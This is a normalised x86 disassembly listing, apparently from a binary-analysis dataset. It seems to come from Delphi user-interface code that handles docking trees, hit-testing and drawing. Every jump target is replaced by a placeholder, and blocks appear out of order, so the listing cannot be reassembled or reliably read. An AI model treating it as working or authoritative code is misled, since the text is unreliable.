mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_457508
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4561ec
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_45788c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4561ec
mov eax [ esi + 0x64 ]
call sub_455e38
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_4579c0
xor edx edx
mov eax esi
call sub_4561ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_455e60
adc edx 0x0
mov eax ebx
call sub_455b20
mov eax ebx
call sub_455eb0
push esi
push sub_4579c0
xor edx edx
mov eax esi
call sub_4561ec
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_456640
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_455b20
mov eax [ ebx + 0x14 ]
call sub_455eb0
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_4566b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_455e38
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_455e38
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_455e38
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_455a04
mov esi eax
mov edx 0x2
mov eax ebx
call sub_455a04
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_455e38
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_455f10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_455f38
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455f10
call sub_4566b8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455f38
call sub_4566b8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_455a70
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_455a70
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_4568e4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4507b8
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_45077c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_416e0c
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456978
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4568e4
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_455f38
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_456184
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_455f38
call sub_4566b8
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_456a00
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403f20
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_40456c
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_456a48
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456c40
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_457118
mov eax [ ebp - 0x8 ]
call sub_456114
xor edx edx
push ebp
push sub_456c23
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456c2a
mov eax [ ebp - 0x8 ]
call sub_456118
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4558ec
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_456a00
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_40338c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_455c0c
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_456a00
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_44d0ac
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_44de8c
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403190
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_456c50
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_416e34
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_424a0c
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456ca8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_423f2c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_424688
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_424628
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_424628
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_423f2c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_424628
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_424628
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_456d30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_456c50
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_456ca8
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_456ca8
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_456c50
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_456ca8
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_456ca8
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_456e0c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456f62
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44bd68
mov eax [ ebp - 0x4 ]
call sub_424660
xor eax eax
push ebp
push sub_456f45
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424a8c
xor eax eax
push ebp
push sub_456f28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_4507b8
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f2f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_424a8c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_45077c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44cb2c
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_456f70
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_4525b8
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_44cbd4
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_44cb90
mov ecx eax
xor edx edx
xor eax eax
call sub_416e34
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_453a88
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416e5c
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_4570e4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4570e4
pop ecx
mov eax ebx
call sub_403190
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4570e4
pop ecx
sub_457118
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_4570e4
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403190
xor eax eax
mov [ esi + 0x64 ] eax
sub_457174
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_456184
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_4571b0
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4571b0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45741d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c50
mov edx [ ebp - 0x8 ]
pop eax
call sub_4041e8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
mov eax [ ebx + 0x14 ]
call sub_455910
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c50
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c50
mov edx [ ebp - 0x10 ]
pop eax
call sub_4041e8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403190
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457424
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f44
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_455cc0
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_455e38
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_455e74
mov eax [ ebx + 0x18 ]
call sub_455cc0
mov [ edx + 0x18 ] eax
push esi
push sub_4579c0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4561ec
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_455e74
mov eax [ esi + 0x64 ]
call sub_455e38
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403190
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_457998
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403190
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_4559bc
mov edx eax
mov eax edi
call sub_455e60
mov eax edi
call sub_455cc0
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_4579c0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4561ec
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
